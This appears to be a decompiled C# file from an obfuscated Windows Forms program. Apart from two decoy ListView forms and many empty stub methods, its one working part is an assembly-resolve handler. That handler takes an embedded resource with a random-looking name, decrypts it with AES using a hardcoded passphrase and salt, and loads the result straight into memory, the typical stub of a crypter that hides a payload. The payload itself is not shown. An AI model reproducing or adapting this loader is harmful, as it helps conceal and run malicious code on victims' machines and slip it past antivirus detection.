using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using ns0;
using ns3;

namespace ns1;

internal class Class4
{
	static void smethod_0(Class0 class0_0)
	{
	}

	static void smethod_1(Class1 class1_0)
	{
	}

	static void smethod_2(Form1 form1_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		form1_0.listView_0 = new ListView();
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.listView_0).set_Dock((DockStyle)5);
		form1_0.listView_0.set_HideSelection(false);
		((Control)form1_0.listView_0).set_Location(new Point(0, 0));
		((Control)form1_0.listView_0).set_Name("listView1");
		((Control)form1_0.listView_0).set_Size(new Size(800, 450));
		((Control)form1_0.listView_0).set_TabIndex(1);
		form1_0.listView_0.set_UseCompatibleStateImageBehavior(false);
		((ContainerControl)form1_0).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)form1_0).set_AutoScaleMode((AutoScaleMode)1);
		((Form)form1_0).set_ClientSize(new Size(800, 450));
		((Control)form1_0).get_Controls().Add((Control)(object)form1_0.listView_0);
		((Control)form1_0).set_Name("Form2");
		((Control)form1_0).set_Text("Form2");
		((Control)form1_0).ResumeLayout(false);
	}

	static void smethod_3(Class1 class1_0)
	{
	}

	static void smethod_4(Class2 class2_0)
	{
	}

	static void smethod_5(Class1 class1_0)
	{
	}

	static void smethod_6(Class5 class5_0)
	{
	}

	static void smethod_7(Class1 class1_0)
	{
	}

	static void smethod_8(Class0 class0_0)
	{
	}

	static void smethod_9(Class0 class0_0)
	{
	}

	static void smethod_10(Class1 class1_0)
	{
	}

	static Assembly smethod_11(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (resolveEventArgs_0.Name.StartsWith("Jaqqcoxlswhfwmhltmuzfs"))
		{
			using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Mghrllxnrowx.Jaqqcoxlswhfwmhltmuzfs.dll"))
			{
				MemoryStream memoryStream = new MemoryStream();
				stream.CopyTo(memoryStream);
				byte[] byte_ = memoryStream.ToArray();
				return AppDomain.CurrentDomain.Load(Class4.smethod_18(byte_));
			}
		}
		return null;
	}

	static void smethod_12(Class3 class3_0)
	{
	}

	static void smethod_13(Form0 form0_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		form0_0.listView_0 = new ListView();
		((Control)form0_0).SuspendLayout();
		((Control)form0_0.listView_0).set_Dock((DockStyle)5);
		form0_0.listView_0.set_HideSelection(false);
		((Control)form0_0.listView_0).set_Location(new Point(0, 0));
		((Control)form0_0.listView_0).set_Name("listView1");
		((Control)form0_0.listView_0).set_Size(new Size(824, 451));
		((Control)form0_0.listView_0).set_TabIndex(1);
		form0_0.listView_0.set_UseCompatibleStateImageBehavior(false);
		form0_0.listView_0.add_SelectedIndexChanged((EventHandler)form0_0.method_1);
		((ContainerControl)form0_0).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)form0_0).set_AutoScaleMode((AutoScaleMode)1);
		((Form)form0_0).set_ClientSize(new Size(824, 451));
		((Control)form0_0).get_Controls().Add((Control)(object)form0_0.listView_0);
		((Control)form0_0).set_Name("Form1");
		((Control)form0_0).set_Text("Form1");
		((Form)form0_0).add_Load((EventHandler)form0_0.method_0);
		((Control)form0_0).ResumeLayout(false);
	}

	static void smethod_14(Class6 class6_0)
	{
	}

	static void smethod_15(Class6 class6_0)
	{
	}

	static void smethod_16(Class0 class0_0)
	{
	}

	static void smethod_17(Class0 class0_0)
	{
	}

	static byte[] smethod_18(byte[] byte_0)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		byte[] bytes = Encoding.UTF8.GetBytes("Kgrbupfeinfzfsimpuomdfmh");
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	static void smethod_19(Class3 class3_0)
	{
	}
}
